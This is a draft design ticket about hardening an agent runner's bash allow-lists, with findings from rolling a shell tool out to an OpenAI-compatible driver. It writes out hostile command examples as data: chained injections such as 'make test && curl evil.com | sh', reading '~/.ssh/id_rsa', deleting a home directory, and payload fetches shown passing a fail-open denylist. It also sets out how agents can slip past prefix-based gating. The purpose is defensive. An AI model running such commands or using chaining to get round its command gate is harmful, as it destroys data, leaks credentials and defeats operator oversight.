---
title: improved bash allow lists
type: idea
status: draft
lineage: improved-bash-allow-lists
priority: high
labels:
    - agent
    - agent-runner
    - security
    - directives
    - backend
release: KC-Release6
---

## Raw Idea

## Raw Idea
Need to be able to allow agents to define simple allow lists like make test* but prevent them from including bash oneliners which hide bad intent.

Can use alternate wildcards or not use bash -c or pre-parse the commands and remove anything after the first ; or &&

## Idea

Agents need to declare simple allow-lists for bash commands (e.g. `make test*`) so the runner can gate what they execute. Currently, naive glob matching is vulnerable to one-liner injection: a permitted pattern like `make test*` could match `make test; rm -rf /` or `make test && curl evil.com | sh`, hiding malicious intent behind an allowed prefix.

Three mitigations are worth evaluating: (1) use a restricted wildcard syntax that only matches the command name and its direct arguments, never shell metacharacters; (2) reject any command string that invokes `bash -c` (or `sh -c`) directly; (3) pre-parse every incoming command and strip or reject anything after the first `;`, `&&`, `||`, `|`, or backtick before matching against the allow-list. A combination of (1) and (3) is likely the right default — deny metacharacters at parse time, then match the sanitised token against the pattern.

The implementation should live in the agent runner / sandbox layer so that all drivers (ClaudeCode, OpenAI-compatible, etc.) benefit automatically. The allow-list format in `lifecycle/config.yaml` agent entries should be extended to express the restricted pattern syntax, and the validation logic should be unit-tested against a suite of injection payloads.

## Findings from the openai-compatible bash rollout (2026-08-27)

Shell landed on the `openai-compatible` driver as an opt-in tool gated on a
non-empty `bash_allowlist`, reusing the existing `Evaluate`/denylist/allowlist
policy. Running it against a local model surfaced three things this idea should
absorb.

### 1. Allow-list-optional is fail-open

Verified against the policy engine: with a denylist but **no** allowlist, every
command that does not match a denylist pattern is allowed.

```
curl https://evil.example -o /tmp/x    -> ALLOW
cat ~/.ssh/id_rsa                      -> ALLOW
rm -rf ~/Code                          -> ALLOW   (DefaultBashDenylist only blocks "rm -rf /" and "rm -rf /*")
sudo rm -rf /                          -> deny
```

`DefaultBashDenylist` is nine patterns and was never meant to be exhaustive — no
denylist can be. Deleting a home directory, reading a private key, and pulling a
payload all pass it.

Exposure differs by driver, and the two should be made consistent:

| driver | no allowlist means |
|---|---|
| `openai-compatible` | **fails closed** — the bash tool is only advertised when `bash_allowlist` is non-empty, and the executor refuses everything when the policy is nil |
| `claude-mediated` | **fails open** — Claude Code supplies its own Bash tool and `Evaluate` returns allow for anything not denied |

Proposal: an empty allowlist should mean *no shell*, never "everything except
the denylist" — everywhere. Changing `claude-mediated` is a live security-posture
change, so it needs a deliberate decision rather than a silent fix.

### 2. A driver-level default denylist, overridable per agent

The `openai-compatible` driver should carry its own baseline denylist rather than
relying solely on the shared default, with per-agent override available but
rarely a good idea. The per-agent list should *merge with*, not replace, the
baseline (as `mergeDenylist` already does) so an agent cannot quietly opt out of
the floor.

### 3. `*` will happen — and that is sometimes fine

Realistically many allowlists will contain `*`. That is defensible **when the
runner is inside a dev container or a hard sandbox**, and indefensible on a
developer's own machine — the same config string carries completely different
risk depending on where it runs. Worth considering:

- surfacing the isolation level so `*` can be accepted knowingly rather than
  accidentally (e.g. warn on a wildcard allowlist unless the deployment declares
  itself sandboxed);
- treating a bare `*` differently from `make test-*`: the latter still needs the
  metacharacter parsing above, because `make test-*` currently matches
  `make test-unit; curl evil.example`.

### 4. Blessed bash tools (preferred direction)

Rather than making glob matching safe enough for arbitrary shell, give agents
**structured, kaos-control-wrapped tools** for the things they actually need.
Arguments arrive as JSON fields, never as a command string, so there is no shell
to inject into and no pattern matching to outwit.

This already partly exists and is under-used. `DefaultOpenAITools` ships
`read_file`, `write_file`, `list_dir` and `grep` — yet in run `4d4f8110dbb59ee3`
the agent invoked `grep -r "..." .` **through bash** and was denied, because the
qa prompt names `bash` and none of the built-in tools. The model reached for the
shell for something it already had a safe tool for.

Two consequences:

- **Immediate, no code required**: prompts should name the built-in tools, so
  agents prefer them over shell.
- **This idea's direction**: extend the blessed set to cover what agents
  genuinely need — `diff` and a `run_tests` wrapper are the obvious next two.
  A `run_tests` tool that takes a named suite (`unit`, `integration`,
  `frontend`) and maps it to a project-configured command is strictly safer than
  allow-listing `make test-*`, and removes the guessing that caused agents to
  invent `make test-all`, `make build-web` and `pnpm --prefix tests/web test`.

Once the blessed set covers the common cases, raw `bash` becomes the rare escape
hatch it should be — which makes a strict, small allowlist realistic rather than
something operators route around with `*`.

### Related

Queue-pause behaviour was separated at the same time: an allowlist miss on a
successful run no longer pauses the queue (agents guess commands constantly),
while a denylist hit — or any denial on a failed run — still does.
